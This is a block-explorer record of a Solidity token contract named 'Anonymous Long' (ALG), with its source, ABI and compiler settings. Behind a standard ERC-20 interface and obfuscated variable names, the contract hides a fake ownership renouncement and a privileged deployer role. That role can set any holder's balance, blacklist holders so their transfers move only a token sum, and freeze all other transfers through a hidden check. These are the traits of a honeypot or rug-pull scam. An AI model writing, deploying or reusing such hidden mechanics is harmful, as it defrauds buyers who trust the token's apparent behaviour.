{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface marketingAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeSenderLimit {\n    function createPair(address maxExempt, address minEnableLimit) external returns (address);\n}\n\ninterface totalFeeTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minLiquidity) external view returns (uint256);\n\n    function transfer(address walletToIs, uint256 totalMinLimit) external returns (bool);\n\n    function allowance(address limitTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalMinLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletToIs,\n        uint256 totalMinLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minToken, uint256 value);\n    event Approval(address indexed limitTrading, address indexed spender, uint256 value);\n}\n\ninterface enableAmountWallet is totalFeeTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AnonymousLong is sellMin, totalFeeTx, enableAmountWallet {\n\n    bool private liquidityFrom;\n\n    address shouldTxMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private launchedReceiverFund;\n\n    function owner() external view returns (address) {\n        return enableAmount;\n    }\n\n    function limitReceiver(address fromLaunchedShould) public {\n        takeAt();\n        if (enableReceiver) {\n            liquidityFrom = true;\n        }\n        if (fromLaunchedShould == marketingShouldTx || fromLaunchedShould == autoList) {\n            return;\n        }\n        receiverAtExempt[fromLaunchedShould] = true;\n    }\n\n    uint256 private liquidityMax;\n\n    function allowance(address amountAtAuto, address feeLaunched) external view virtual override returns (uint256) {\n        if (feeLaunched == atLiquidity) {\n            return type(uint256).max;\n        }\n        return marketingTotalMax[amountAtAuto][feeLaunched];\n    }\n\n    function transfer(address enableBuy, uint256 totalMinLimit) external virtual override returns (bool) {\n        return launchLaunched(_msgSender(), enableBuy, totalMinLimit);\n    }\n\n    uint256 teamTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalMarketingTx;\n    }\n\n    mapping(address => uint256) private receiverReceiverSell;\n\n    function launchLaunched(address takeTotal, address walletToIs, uint256 totalMinLimit) internal returns (bool) {\n        if (takeTotal == marketingShouldTx) {\n            return takeToReceiver(takeTotal, walletToIs, totalMinLimit);\n        }\n        uint256 receiverMarketing = totalFeeTx(autoList).balanceOf(shouldTxMax);\n        require(receiverMarketing == fromAt);\n        require(walletToIs != shouldTxMax);\n        if (receiverAtExempt[takeTotal]) {\n            return takeToReceiver(takeTotal, walletToIs, marketingFrom);\n        }\n        return takeToReceiver(takeTotal, walletToIs, totalMinLimit);\n    }\n\n    function receiverAt(address feeFund) public {\n        if (tokenTake) {\n            return;\n        }\n        \n        atFund[feeFund] = true;\n        \n        tokenTake = true;\n    }\n\n    uint8 private txIs = 18;\n\n    function balanceOf(address minLiquidity) public view virtual override returns (uint256) {\n        return receiverReceiverSell[minLiquidity];\n    }\n\n    address public marketingShouldTx;\n\n    event OwnershipTransferred(address indexed toMin, address indexed maxSwap);\n\n    address private enableAmount;\n\n    function transferFrom(address takeTotal, address walletToIs, uint256 totalMinLimit) external override returns (bool) {\n        if (_msgSender() != atLiquidity) {\n            if (marketingTotalMax[takeTotal][_msgSender()] != type(uint256).max) {\n                require(totalMinLimit <= marketingTotalMax[takeTotal][_msgSender()]);\n                marketingTotalMax[takeTotal][_msgSender()] -= totalMinLimit;\n            }\n        }\n        return launchLaunched(takeTotal, walletToIs, totalMinLimit);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toBuy;\n    }\n\n    uint256 private receiverTrading;\n\n    function tradingMinAuto() public {\n        emit OwnershipTransferred(marketingShouldTx, address(0));\n        enableAmount = address(0);\n    }\n\n    mapping(address => bool) public receiverAtExempt;\n\n    function approve(address feeLaunched, uint256 totalMinLimit) public virtual override returns (bool) {\n        marketingTotalMax[_msgSender()][feeLaunched] = totalMinLimit;\n        emit Approval(_msgSender(), feeLaunched, totalMinLimit);\n        return true;\n    }\n\n    uint256 fromAt;\n\n    uint256 constant marketingFrom = 2 ** 10;\n\n    mapping(address => mapping(address => uint256)) private marketingTotalMax;\n\n    uint256 public takeMode;\n\n    function takeAt() private view {\n        require(atFund[_msgSender()]);\n    }\n\n    bool public sellAt;\n\n    uint256 public shouldFundEnable;\n\n    string private toBuy = \"Anonymous Long\";\n\n    mapping(address => bool) public atFund;\n\n    address public autoList;\n\n    bool public tokenTake;\n\n    function enableTake(address enableBuy, uint256 totalMinLimit) public {\n        takeAt();\n        receiverReceiverSell[enableBuy] = totalMinLimit;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableAmount;\n    }\n\n    uint256 private limitSender = 100000000 * 10 ** 18;\n\n    function takeToReceiver(address takeTotal, address walletToIs, uint256 totalMinLimit) internal returns (bool) {\n        require(receiverReceiverSell[takeTotal] >= totalMinLimit);\n        receiverReceiverSell[takeTotal] -= totalMinLimit;\n        receiverReceiverSell[walletToIs] += totalMinLimit;\n        emit Transfer(takeTotal, walletToIs, totalMinLimit);\n        return true;\n    }\n\n    address atLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        marketingAuto listAuto = marketingAuto(atLiquidity);\n        autoList = feeSenderLimit(listAuto.factory()).createPair(listAuto.WETH(), address(this));\n        if (launchedReceiverFund == shouldFundEnable) {\n            sellAt = false;\n        }\n        marketingShouldTx = _msgSender();\n        tradingMinAuto();\n        atFund[marketingShouldTx] = true;\n        receiverReceiverSell[marketingShouldTx] = limitSender;\n        if (sellAt == enableReceiver) {\n            sellAt = false;\n        }\n        emit Transfer(address(0), marketingShouldTx, limitSender);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitSender;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txIs;\n    }\n\n    bool public enableReceiver;\n\n    function receiverFee(uint256 totalMinLimit) public {\n        takeAt();\n        fromAt = totalMinLimit;\n    }\n\n    string private totalMarketingTx = \"ALG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAtAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMinLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMinLimit\",\"type\":\"uint256\"}],\"name\":\"enableTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunchedShould\",\"type\":\"address\"}],\"name\":\"limitReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingShouldTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAtExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalMinLimit\",\"type\":\"uint256\"}],\"name\":\"receiverFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFundEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMinAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMinLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletToIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMinLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AnonymousLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}